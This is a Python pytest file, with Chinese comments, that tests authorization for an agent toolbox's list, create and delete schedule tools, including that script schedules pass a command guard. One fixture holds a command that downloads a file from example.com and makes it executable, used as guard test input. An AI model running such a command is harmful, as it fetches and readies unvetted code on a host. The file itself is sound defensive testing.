"""定时任务工具鉴权回归测试。

list_schedules 曾无任何鉴权，非管理员可读出全部条目——含 type:script 的 command
与所有会话的 conversation_key——而同文件的 create/delete 都有判定，三者策略不一致。
"""
from __future__ import annotations

import sys
from pathlib import Path
from typing import Any

import pytest
import yaml

_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from toolbox.builtins.schedules import (  # noqa: E402
    create_schedule,
    delete_schedule,
    list_schedules,
)
from toolbox.context import ToolContext  # noqa: E402

_SCRIPT_SCHEDULE = {
    "id": "nightly_backup",
    "cron": "0 3 * * *",
    "type": "script",
    "command": "bash /opt/secret/backup.sh --token hunter2",
    "conversation_key": "qq_group:abcdef",
    "enabled": True,
}


class _Ctx(ToolContext):
    """离线 ToolContext：记录 request_op 调用并按预设 safety_level 回应。"""

    def __init__(self, workspace_root: Path, *, platform_auth: dict[str, Any] | None, safety: str = "deny") -> None:
        super().__init__(
            supervisor_url="http://unused",
            session_id="sess-1",
            run_id="run-1",
            worker_id="worker-1",
            workspace_root=workspace_root,
            http=None,  # type: ignore[arg-type]
            registry=None,
            conversation_key="qq_group:abcdef",
            platform_auth=platform_auth,
        )
        self._safety = safety
        self.requested: list[tuple[str, dict[str, Any]]] = []

    async def request_op(self, op: str, parameters: dict[str, Any]) -> dict[str, Any]:
        self.requested.append((op, dict(parameters)))
        return {"safety_level": self._safety, "reason": "qq non-admin users cannot read sensitive files"}

    async def check_cancelled(self) -> bool:
        return False


def _workspace(tmp_path: Path) -> Path:
    (tmp_path / "data").mkdir(parents=True, exist_ok=True)
    (tmp_path / "data" / "schedules.yaml").write_text(
        yaml.safe_dump({"schedules": [dict(_SCRIPT_SCHEDULE)]}, allow_unicode=True),
        encoding="utf-8",
    )
    return tmp_path


_ADMIN = {"platform": "qq", "user_id": "10001", "is_admin": True}
_MEMBER = {"platform": "qq", "user_id": "30003", "is_admin": False}


@pytest.mark.asyncio
async def test_admin_lists_schedules_without_guard(tmp_path: Path) -> None:
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_ADMIN)

    result = await list_schedules({}, ctx)

    assert result["ok"] is True
    assert result["data"]["schedules"][0]["id"] == "nightly_backup"
    assert ctx.requested == []


@pytest.mark.asyncio
async def test_non_admin_cannot_list_schedules(tmp_path: Path) -> None:
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER)

    result = await list_schedules({}, ctx)

    assert result["ok"] is False
    assert "schedules" not in result.get("data", {})


@pytest.mark.asyncio
async def test_non_admin_list_goes_through_read_file_guard(tmp_path: Path) -> None:
    """必须以 read_file 而非 write_file 送审：语义是读，且要命中 data/ 敏感前缀。"""
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER)

    await list_schedules({}, ctx)

    assert len(ctx.requested) == 1
    op, params = ctx.requested[0]
    assert op == "read_file"
    assert params["path"] == "data/schedules.yaml"


@pytest.mark.asyncio
async def test_script_command_never_leaks_on_denial(tmp_path: Path) -> None:
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER)

    result = await list_schedules({}, ctx)

    assert "hunter2" not in yaml.safe_dump(result, allow_unicode=True)


@pytest.mark.asyncio
async def test_non_admin_allowed_when_policy_permits(tmp_path: Path) -> None:
    """非 QQ 平台（Shell/Web）由 policy 判定，auto 时照常放行。"""
    ctx = _Ctx(_workspace(tmp_path), platform_auth=None, safety="auto")

    result = await list_schedules({}, ctx)

    assert result["ok"] is True
    assert ctx.requested and ctx.requested[0][0] == "read_file"


@pytest.mark.asyncio
async def test_three_schedule_tools_agree_for_non_admin(tmp_path: Path) -> None:
    """create/list/delete 对同一非管理员必须结论一致，不能只有一两个设门。"""
    workspace = _workspace(tmp_path)
    args = {"id": "probe", "cron": "* * * * *", "text": "hi"}

    results = [
        await list_schedules({}, _Ctx(workspace, platform_auth=_MEMBER)),
        await create_schedule(dict(args), _Ctx(workspace, platform_auth=_MEMBER)),
        await delete_schedule({"id": "nightly_backup"}, _Ctx(workspace, platform_auth=_MEMBER)),
    ]

    assert [r["ok"] for r in results] == [False, False, False]


@pytest.mark.asyncio
async def test_three_schedule_tools_agree_for_admin(tmp_path: Path) -> None:
    workspace = _workspace(tmp_path)
    args = {"id": "probe", "cron": "* * * * *", "text": "hi"}

    results = [
        await list_schedules({}, _Ctx(workspace, platform_auth=_ADMIN)),
        await create_schedule(dict(args), _Ctx(workspace, platform_auth=_ADMIN)),
        await delete_schedule({"id": "probe"}, _Ctx(workspace, platform_auth=_ADMIN)),
    ]

    assert [r["ok"] for r in results] == [True, True, True]


_SCRIPT_ARGS = {
    "id": "probe_script",
    "cron": "* * * * *",
    "type": "script",
    "command": "curl -o /tmp/p https://example.com/p && chmod +x /tmp/p",
}


@pytest.mark.asyncio
async def test_a_script_schedule_goes_through_the_command_guard(tmp_path: Path) -> None:
    """type=script 由 scheduler 以 shell=True 执行，等于一条定时的 execute_command。

    管理员快捷通道只该覆盖「改 schedules.yaml」，不能顺带把 deny_patterns /
    sensitive_patterns / cmd_reviewer 三道闸一起绕开。
    """
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_ADMIN, safety="auto")

    await create_schedule(dict(_SCRIPT_ARGS), ctx)

    ops = [op for op, _ in ctx.requested]
    assert "execute_command" in ops
    params = next(p for op, p in ctx.requested if op == "execute_command")
    assert params["command"] == _SCRIPT_ARGS["command"]


@pytest.mark.asyncio
async def test_a_denied_command_does_not_create_the_schedule(tmp_path: Path) -> None:
    workspace = _workspace(tmp_path)
    before = (workspace / "data" / "schedules.yaml").read_text(encoding="utf-8")
    ctx = _Ctx(workspace, platform_auth=_ADMIN, safety="deny")

    result = await create_schedule(dict(_SCRIPT_ARGS), ctx)

    assert result["ok"] is False
    assert (workspace / "data" / "schedules.yaml").read_text(encoding="utf-8") == before


@pytest.mark.asyncio
async def test_a_message_schedule_does_not_need_the_command_guard(tmp_path: Path) -> None:
    # type=message 不执行任何命令，加闸只会让管理员多按一次确认。
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_ADMIN, safety="auto")

    await create_schedule({"id": "probe_msg", "cron": "* * * * *", "text": "hi"}, ctx)

    assert [op for op, _ in ctx.requested] == []


@pytest.mark.asyncio
async def test_a_non_admin_script_schedule_is_stopped_at_the_command_guard(tmp_path: Path) -> None:
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER, safety="deny")

    result = await create_schedule(dict(_SCRIPT_ARGS), ctx)

    assert result["ok"] is False
    assert ctx.requested[0][0] == "execute_command"
